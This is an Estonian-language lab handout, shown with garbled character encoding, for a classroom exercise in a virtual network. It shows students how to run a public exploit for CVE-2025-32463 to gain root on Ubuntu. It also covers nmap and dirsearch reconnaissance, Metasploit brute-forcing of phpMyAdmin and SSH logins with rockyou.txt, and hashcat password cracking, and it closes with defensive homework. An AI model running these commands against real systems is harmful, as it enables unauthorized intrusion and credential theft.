# âš™ï¸ PRAKTILINE TUND: VÃµrguturbe RÃ¼nnakute Simulatsioon
**Autor:** ocrHeiki
**Ã•ppeaeg:** 31.10.2025

## Sissejuhatus
See praktikum tutvustab vÃµrguturbe pÃµhitÃµdesid lÃ¤bi praktilise harjutuse. Me seadistame virtuaalse keskkonna, simuleerime erinevaid rÃ¼nnakuid ja uurime, kuidas sÃ¼steemid vÃµivad olla haavatavad. TÃ¶Ã¶voog jÃ¤rgib jÃ¤rjestust: masinate seadistamine, privilege escalation Ubuntu Serveris, skÃ¤nnimine ja uurimine Kali masinaga, ning lÃµpuks kodutÃ¶Ã¶ kaitsmise kohta. KÃµik toimub kontrollitud virtuaalses keskkonnas, et Ãµppida turvaliselt.

## Masinad :computer:
---
- **Ubuntu Server testmasin**: Seadistatud virtuaalselt, kasutatud ISO kÃ¼lgeÃ¼hendamist.
- **Ruuter koos 2 network adapteriga**: Esimene adapter INTERNET, teine meie nimeline VLAN. ISO kÃ¼lgeÃ¼hendatud mÃµlemale.
- **App masin**: VÃµetud Template kaustast, lisaks mujalt masinad.

## :computer: Ubuntu Server: Privilege Escalation Simulatsioon
---
1. Paigalda GCC kompilaator:  
   `sudo apt install gcc`

2. Loo uus kasutaja ilma sudo Ãµigusteta:  
   `sudo adduser kala` (parool: `ka1a`)  
   Logi vÃ¤lja sudo kasutajast (`exit`) ja sisse uue kasutajaga.

3. TÃµmba alla haavatavuse masin (simulatsioon):  
   `git clone https://github.com/kh4sh3i/CVE-2025-32463.git`

4. Uuri kaustu:  
   `ls`  
   Liigu kausta: `cd CVE-2025-32463` (kasuta Tab-klahvi tÃ¤iendamiseks).

5. Muuda skript kÃ¤ivitatavaks ja kÃ¤ivita:  
   `chmod +x exploit.sh`  
   Kontrolli kasutaja ID: `id`  
   KÃ¤ivita exploit: `./exploit.sh` (saad root-Ãµigused).

6. MÃ¤Ã¤ra root-parool (kui puudub):  
   `passwd root` (parool: `ruutjuur`)

7. Uuenda sÃ¼steem ja paigalda sudo:  
   `apt update && apt install sudo`

## :computer: Kali: SkÃ¤nnimine, Andmebaasi RÃ¼nnakud ja Brute Force
---
### Alustame NMAP-iga (vÃµrgu skÃ¤nnimine)
- SkÃ¤nni vÃµrku teenuste ja OS-idega:  
  `sudo nmap -sV -O 192.168.1.0/24` (lisa oma vÃµrgu ID).  
  NÃ¤ed tulemusi, sealhulgas port 22 (SSH), mis on hÃ¤kkerite sihtmÃ¤rk. Port knocking vÃµib seda avada.

- Ava skÃ¤nnis leitud IP (nt 192.168.1.69) brauseris: NÃ¤ed WordPressi lehte.  
  Kontrolli protokolle terminalis:  
  `whatweb 192.168.1.69` (nÃ¤itab veebilehe ehitust).

- Paigalda ja kasuta dirsearch tÃ¶Ã¶riista:  
  `sudo apt install dirsearch -y`  
  `dirsearch -u "192.168.1.69"` (uurib katalooge).

### Metasploit: phpMyAdmin Login Brute Force
- Ava Metasploit:  
  `msfconsole`

- Vali moodul:  
  `use auxiliary/scanner/http/phpmyadmin_login`

- Vaata valikuid:  
  `options`

- MÃ¤Ã¤ra sihtmÃ¤rk:  
  `set rhost 192.168.1.69`  
  `set targeturi /phpmyadmin/index.php`

- Loo kasutajate fail:  
  `echo root >> /tmp/user.txt`  
  `set user_file /tmp/user.txt`

- MÃ¤Ã¤ra paroolide fail (kasuta rockyou.txt):  
  `set pass_file /home/heiki/Documents/rockyou.txt`

- KÃ¤ivita (ainult omal vastutusel, kriminaalne tegevus):  
  `run`  
  Saad andmebaasi parooli ja WordPressi hashitud parooli.  
  VÃ¤lju: `exit`

### Hashcat: Parooli Krakkimine
- Kraki hashitud parool:  
  `hashcat 'hashitud_parool' /usr/share/wordlists/rockyou.txt.gz`  
  Saad selge parooli, millega sisse logida WordPressi admin-kontosse.  
  (White-hat hÃ¤kkerina: Tee postitus nÃµrga parooli kohta.)

### Metasploit: SSH Login Brute Force
- Vali moodul:  
  `use auxiliary/scanner/ssh/ssh_login`

- MÃ¤Ã¤ra failid:  
  `set user_file /tmp/user.txt`  
  `set pass_file /home/heiki/Documents/rockyou.txt`

- KÃ¤ivita:  
  `run`

## KodutÃ¶Ã¶ ğŸ““
Kirjelda, kuidas neid kolme rÃ¼nnakut (privilege escalation Ubuntu Serveris, NMAP-skÃ¤nnimine ja Metasploit-rÃ¼nnakud Kali masinaga) sÃ¼steemi eest kaitsta. Tee sellest dokumentatsioon, mis sisaldab potentsiaalseid viise kaitsmiseks.
